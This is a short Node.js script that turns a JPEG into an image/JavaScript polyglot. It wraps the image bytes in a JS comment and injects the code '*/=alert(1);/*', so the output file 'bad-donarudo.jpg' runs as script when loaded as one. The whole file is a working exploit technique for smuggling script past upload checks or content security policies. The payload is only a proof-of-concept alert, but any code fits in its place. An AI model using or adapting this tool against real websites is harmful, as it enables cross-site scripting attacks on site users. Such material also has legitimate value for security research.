const fs = require('fs');

const image = fs.readFileSync('images/donarudo.jpg');
const hex = image.toString('hex');
const soi = hex.substr(0,8);
const commentStart = '2f2a'; // /*
const header = hex.substr(12,28);
const nullBytes = Array(12044).fill('00').join('');
const code = `*/=alert(1);/*`.split('').map(e => e.charCodeAt(0).toString(16)).join('');
const payload = hex.substr(40, hex.length - 4);
const commentEnd = '2a2f'; // */
const eoi = hex.substr(hex.length - 4);
const injectedJsJpeg = soi + commentStart + header + nullBytes + code + payload + commentEnd + eoi;
const hexBinary = new Buffer(injectedJsJpeg, 'hex');

fs.writeFileSync('images/bad-donarudo.jpg', hexBinary);
